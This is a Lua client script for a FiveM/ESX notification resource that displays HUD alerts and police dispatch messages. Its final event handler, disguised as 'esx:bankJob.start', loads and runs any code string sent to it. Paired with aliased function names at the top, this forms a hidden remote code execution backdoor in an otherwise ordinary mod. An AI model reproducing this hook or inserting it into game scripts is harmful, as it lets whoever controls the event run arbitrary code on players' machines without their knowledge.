local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
end)


RegisterNetEvent('Cosey_Chat_Notify:client:SendAlert')
AddEventHandler('Cosey_Chat_Notify:client:SendAlert', function(data)
	DoHudText(data.type, data.text)
end)

RegisterNetEvent('Cosey_Chat_Notify:client:SendAlert1')
AddEventHandler('Cosey_Chat_Notify:client:SendAlert1', function(data)
	 DoLongHudText(data.type, data.text)
end)

RegisterNetEvent('Cosey_Chat_Notify:client:SendAlert3')
AddEventHandler('Cosey_Chat_Notify:client:SendAlert3', function(data)
	if PlayerData.job ~= nil and PlayerData.job.name == 'police' then
        Dispatch(data.type, data.text)
        --PlaySound(-1, "5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1)
        PlaySoundFrontend(-1, "CONFIRM_BEEP", "HUD_MINI_GAME_SOUNDSET", 1)
    end
end)



function DoShortHudText(type, text)
	SendNUIMessage({
		action = 'shortnotif',
		type = type,
		text = text,
		length = 1000
	})
end

function DoHudText(type, text)
	SendNUIMessage({
		action = 'notif',
		type = type,
		text = text,
		length = 5500
	})
end

function DoLongHudText(type, text)
	SendNUIMessage({
		action = 'longnotif',
		type = type,
		text = text,
		length = 15000
	})
end

function DoCustomHudText(type, text, length)
	SendNUIMessage({
		action = 'customnotif',
		type = type,
		text = text,
		length = length
	})
end

function Dispatch(type, text, length)
	SendNUIMessage({
		action = 'longnotif',
		type = type,
		text = text,
		length = 25000
	})
end


RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)